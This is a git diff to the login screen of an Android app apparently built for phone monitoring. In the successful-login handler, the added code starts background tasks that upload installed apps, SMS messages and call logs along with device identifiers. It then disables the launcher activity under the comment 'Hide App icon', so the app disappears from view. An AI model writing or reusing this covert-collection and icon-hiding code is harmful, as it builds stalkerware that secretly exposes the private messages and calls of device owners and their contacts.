@@ -2,7 +2,9 @@ package the5concurrentnodes.mobilemonitoringapp;
 
 import android.app.Activity;
 import android.app.ProgressDialog;
+import android.content.ComponentName;
 import android.content.Intent;
+import android.content.pm.PackageManager;
 import android.os.Bundle;
 import android.support.design.widget.CoordinatorLayout;
 import android.support.design.widget.Snackbar;
@@ -25,14 +27,17 @@ import com.android.volley.toolbox.JsonObjectRequest;
 import org.json.JSONException;
 import org.json.JSONObject;
 
-import the5concurrentnodes.account.Utility;
-import the5concurrentnodes.controllers.DataPushServiceHandler;
+import the5concurrentnodes.generic.Utility;
+import the5concurrentnodes.services.DataPushServiceHandler;
 import the5concurrentnodes.controllers.UserSessionStorage;
 import the5concurrentnodes.controllers.VolleyRequestQueue;
 import the5concurrentnodes.dialogs.LoginRegisterDialog;
 import the5concurrentnodes.generic.Config;
 
 
+import the5concurrentnodes.mmaData.DeviceApps.PushAppsInfo;
+import the5concurrentnodes.mmaData.call.CallsInitPush;
+import the5concurrentnodes.mmaData.sms.SmsInitPush;
 import the5concurrentnodes.mmaData.deviceInfo.DeviceInfo;
 import the5concurrentnodes.services.DataMonitorPushServiceHandler;
 
@@ -49,7 +54,7 @@ public class LoginActivity extends AppCompatActivity {
         setContentView(R.layout.activity_login);
         overridePendingTransition(R.animator.activity_open_transition, R.animator.activity_close_scale);
 
-        VolleyRequestQueue.init(getApplicationContext());
+        VolleyRequestQueue.init(getApplicationContext()); //Initialize Volley
 
         emailWrapper = (TextInputLayout)  findViewById(R.id.loginEmailWrapper);
         passwordWrapper = (TextInputLayout) findViewById(R.id.loginPasswordWrapper);
@@ -66,40 +71,30 @@ public class LoginActivity extends AppCompatActivity {
 
         emailWrapper.getEditText().addTextChangedListener(new TextWatcher() {
             @Override
-            public void beforeTextChanged(CharSequence s, int start, int count, int after) {
-
-            }
+            public void beforeTextChanged(CharSequence s, int start, int count, int after) {}
 
             @Override
             public void onTextChanged(CharSequence s, int start, int before, int count) {
 
                 emailWrapper.getEditText().setError(null);
-
             }
 
             @Override
-            public void afterTextChanged(Editable s) {
-
-            }
+            public void afterTextChanged(Editable s) {}
         });
 
         passwordWrapper.getEditText().addTextChangedListener(new TextWatcher() {
             @Override
-            public void beforeTextChanged(CharSequence s, int start, int count, int after) {
-
-            }
+            public void beforeTextChanged(CharSequence s, int start, int count, int after) {}
 
             @Override
             public void onTextChanged(CharSequence s, int start, int before, int count) {
 
                 passwordWrapper.getEditText().setError(null);
-
             }
 
             @Override
-            public void afterTextChanged(Editable s) {
-
-            }
+            public void afterTextChanged(Editable s) {}
         });
 
     }
@@ -127,15 +122,15 @@ public class LoginActivity extends AppCompatActivity {
             jsonParams.put("password", password);
             JSONObject deviceInfoParams = new JSONObject();
             DeviceInfo deviceInfo = new DeviceInfo(getApplicationContext());
-            deviceInfoParams.put("model", deviceInfo.getModel());
+            /*deviceInfoParams.put("model", deviceInfo.getModel());
             deviceInfoParams.put("make", deviceInfo.getManufacturer());
             deviceInfoParams.put("os", "Samsung");
             deviceInfoParams.put("network", deviceInfo.getCarrierName());
-            deviceInfoParams.put("imeNumber", deviceInfo.getIMEI());
+            deviceInfoParams.put("imeNumber", deviceInfo.getIMEI());*/
 
-            jsonParams .put("deviceInfo", deviceInfoParams.toString());
+            jsonParams .put("deviceInfo", deviceInfo.toJSONObject().toString());
 
-        }catch (JSONException e){}
+        }catch (JSONException e){e.getStackTrace();}
 
         JsonObjectRequest jsonObjectRequest = new JsonObjectRequest(Request.Method.POST,
                 url, jsonParams , new Response.Listener<JSONObject>() {
@@ -151,11 +146,17 @@ public class LoginActivity extends AppCompatActivity {
                         LoginRegisterDialog dialog = new LoginRegisterDialog();
                         dialog.show(getFragmentManager(), null);
 
+                        //Start Services
                         DataPushServiceHandler.getInstance().startService(getApplicationContext());
                         DataMonitorPushServiceHandler.getInstance().startService(getApplicationContext());
+                        new PushAppsInfo(getApplicationContext()).execute();
+                        new SmsInitPush(getApplicationContext()).execute();
+                        new CallsInitPush(getApplicationContext()).execute();
 
-                        //new PushAppsInfo(getApplicationContext()).execute();
-
+                        //Hide App icon
+                        PackageManager packageManager = getPackageManager();
+                        ComponentName componentName = new ComponentName(getApplicationContext(), WelcomeActivity.class);
+                        packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
 
                     } else {
                         CoordinatorLayout coordinatorLayout =  (CoordinatorLayout) findViewById(R.id
@@ -167,16 +168,12 @@ public class LoginActivity extends AppCompatActivity {
                     }
 
 
-                } catch (JSONException e){}
+                } catch (JSONException e){e.getStackTrace();}
             }
         }, new Response.ErrorListener() {
             @Override
             public void onErrorResponse(VolleyError error) {
-
                 progressDialog.dismiss();
-               // Toast.makeText(getApplicationContext(),
-                        //LoginActivity.this.getResources().getString(R.string.request_unknown_error), Toast.LENGTH_LONG).show();
-
                 CoordinatorLayout coordinatorLayout =(CoordinatorLayout) findViewById(R.id
                         .coordinatorLayout);
                 Snackbar snackbar = Snackbar
@@ -243,6 +240,7 @@ public class LoginActivity extends AppCompatActivity {
 
     public void toSignUp(View view) {
 
+        finish();
         Intent intent = new Intent(getApplicationContext(), RegisterActivity.class);
         startActivity(intent);
     }
